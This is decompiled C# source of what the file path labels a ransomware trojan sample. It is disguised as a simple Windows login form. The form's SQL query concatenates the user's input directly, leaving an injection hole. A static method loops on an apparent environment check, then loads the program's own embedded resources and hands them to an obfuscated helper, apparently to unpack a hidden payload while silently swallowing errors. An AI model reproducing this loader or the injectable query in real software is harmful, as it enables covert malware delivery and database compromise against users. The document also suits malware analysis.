// Decompiled with JetBrains decompiler
// Type: Bp2s.Ym89
// Assembly: s7C0, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 698C1E7D-67E8-43E5-A826-841A2BEBB89C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.06\HEUR-Trojan-Ransom.MSIL.Blocker.gen-870f6ee038047eaf74564a88e5720843676d449d4bfd7e893e0958851e7f5a3c.exe

using f7W1;
using Hn20;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Nw4c;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace Bp2s
{
  [DesignerGenerated]
  public class Ym89 : Form
  {
    private IContainer components;

    public Ym89()
    {
      this.Load += new EventHandler(this.Na6c);
      this.q9N1();
    }

    [DebuggerNonUserCode]
    protected virtual void p6RA(bool k8H0)
    {
      try
      {
        if (!k8H0 || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        this.Dispose(k8H0);
      }
    }

    [field: AccessedThroughProperty("LogoPictureBox")]
    internal virtual PictureBox LogoPictureBox { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Label UsernameLabel
    {
      get => this._UsernameLabel;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Li48);
        Label usernameLabel1 = this._UsernameLabel;
        if (usernameLabel1 != null)
          usernameLabel1.Click -= eventHandler;
        this._UsernameLabel = value;
        Label usernameLabel2 = this._UsernameLabel;
        if (usernameLabel2 == null)
          return;
        usernameLabel2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("PasswordLabel")]
    internal virtual Label PasswordLabel { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("UsernameTextBox")]
    internal virtual TextBox UsernameTextBox { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("PasswordTextBox")]
    internal virtual TextBox PasswordTextBox { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button OK
    {
      get => this._OK;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Wr83);
        Button ok1 = this._OK;
        if (ok1 != null)
          ok1.Click -= eventHandler;
        this._OK = value;
        Button ok2 = this._OK;
        if (ok2 == null)
          return;
        ok2.Click += eventHandler;
      }
    }

    internal virtual Button Cancel
    {
      get => this._Cancel;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Rj45);
        Button cancel1 = this._Cancel;
        if (cancel1 != null)
          cancel1.Click -= eventHandler;
        this._Cancel = value;
        Button cancel2 = this._Cancel;
        if (cancel2 == null)
          return;
        cancel2.Click += eventHandler;
      }
    }

    [DebuggerStepThrough]
    private void q9N1()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Ym89));
      this.LogoPictureBox = new PictureBox();
      this.UsernameLabel = new Label();
      this.PasswordLabel = new Label();
      this.UsernameTextBox = new TextBox();
      this.PasswordTextBox = new TextBox();
      this.OK = new Button();
      this.Cancel = new Button();
      ((ISupportInitialize) this.LogoPictureBox).BeginInit();
      this.SuspendLayout();
      this.LogoPictureBox.Image = (Image) componentResourceManager.GetObject("LogoPictureBox.Image");
      this.LogoPictureBox.Location = new Point(0, 0);
      this.LogoPictureBox.Name = "LogoPictureBox";
      this.LogoPictureBox.Size = new Size(165, 193);
      this.LogoPictureBox.TabIndex = 0;
      this.LogoPictureBox.TabStop = false;
      this.UsernameLabel.Location = new Point(172, 24);
      this.UsernameLabel.Name = "UsernameLabel";
      this.UsernameLabel.Size = new Size(220, 23);
      this.UsernameLabel.TabIndex = 0;
      this.UsernameLabel.Text = "&User name";
      this.UsernameLabel.TextAlign = ContentAlignment.MiddleLeft;
      this.PasswordLabel.Location = new Point(172, 81);
      this.PasswordLabel.Name = "PasswordLabel";
      this.PasswordLabel.Size = new Size(220, 23);
      this.PasswordLabel.TabIndex = 2;
      this.PasswordLabel.Text = "&Password";
      this.PasswordLabel.TextAlign = ContentAlignment.MiddleLeft;
      this.UsernameTextBox.Location = new Point(174, 44);
      this.UsernameTextBox.Name = "UsernameTextBox";
      this.UsernameTextBox.Size = new Size(220, 20);
      this.UsernameTextBox.TabIndex = 1;
      this.PasswordTextBox.Location = new Point(174, 101);
      this.PasswordTextBox.Name = "PasswordTextBox";
      this.PasswordTextBox.PasswordChar = '*';
      this.PasswordTextBox.Size = new Size(220, 20);
      this.PasswordTextBox.TabIndex = 3;
      this.OK.Location = new Point(197, 161);
      this.OK.Name = "OK";
      this.OK.Size = new Size(94, 23);
      this.OK.TabIndex = 4;
      this.OK.Text = "&OK";
      this.Cancel.DialogResult = DialogResult.Cancel;
      this.Cancel.Location = new Point(300, 161);
      this.Cancel.Name = "Cancel";
      this.Cancel.Size = new Size(94, 23);
      this.Cancel.TabIndex = 5;
      this.Cancel.Text = "&Cancel";
      this.AcceptButton = (IButtonControl) this.OK;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.CancelButton = (IButtonControl) this.Cancel;
      this.ClientSize = new Size(401, 192);
      this.Controls.Add((Control) this.Cancel);
      this.Controls.Add((Control) this.OK);
      this.Controls.Add((Control) this.PasswordTextBox);
      this.Controls.Add((Control) this.UsernameTextBox);
      this.Controls.Add((Control) this.PasswordLabel);
      this.Controls.Add((Control) this.UsernameLabel);
      this.Controls.Add((Control) this.LogoPictureBox);
      this.FormBorderStyle = FormBorderStyle.FixedDialog;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = "Login";
      this.SizeGripStyle = SizeGripStyle.Hide;
      this.StartPosition = FormStartPosition.CenterParent;
      this.Text = "LOGIN - RAFLI RAMADHAN";
      ((ISupportInitialize) this.LogoPictureBox).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    public void d4D3()
    {
      this.UsernameTextBox.Clear();
      this.PasswordTextBox.Clear();
      this.UsernameTextBox.Focus();
    }

    public void p3J9()
    {
      y4B7.j1DM();
      y4B7.cmd = new SqlCommand("select * from tbl_user where username='" + this.UsernameTextBox.Text + "' AND password='" + this.PasswordTextBox.Text + "'", y4B7.conn);
      y4B7.dr = y4B7.cmd.ExecuteReader();
      y4B7.dr.Read();
    }

    private void Wr83(object f1J9, EventArgs Tp7e)
    {
      Xq18 xq18 = new Xq18();
      this.p3J9();
      if (y4B7.dr.HasRows)
      {
        xq18.kodeuser.Text = Conversions.ToString(y4B7.dr[0]);
        this.Visible = false;
        xq18.Show();
      }
      else
      {
        int num = (int) Interaction.MsgBox((object) "Username atau password salah");
      }
    }

    private void Rj45(object e3ZC, EventArgs Jm90) => this.d4D3();

    private void Li48(object r9RZ, EventArgs w0B6)
    {
    }

    private void Na6c(object a9WF, EventArgs s1XF) => this.CenterToScreen();

    [STAThread]
    public static void n8TS()
    {
      try
      {
        int num1 = 4;
        while (!Ld7n.d6D1())
        {
          checked { num1 *= 2; }
          if (num1 > 100000)
            num1 = checked ((int) Math.Round(unchecked ((double) num1 / 50000.0)));
        }
        List<object> r0HF = new List<object>();
        int count1 = r0HF.Count;
        while (count1 <= 0)
        {
          checked { ++count1; }
          r0HF.Add((object) count1);
        }
        r0HF.Add((object) Assembly.LoadFrom(Application.ExecutablePath));
        r0HF.Add(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(r0HF[1], (System.Type) null, "GetManifestResourceNames", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)));
        if (r0HF[2] == null || r0HF.Count <= 2)
          return;
        Ld7n.t0JT(r0HF);
        int count2 = r0HF.Count;
        if (count2 > 0)
        {
          int num2 = checked (count2 * 25 * 25);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    static void Br21()
    {
      // ISSUE: unable to decompile the method.
    }

    static void i1JL()
    {
      // ISSUE: unable to decompile the method.
    }
  }
}
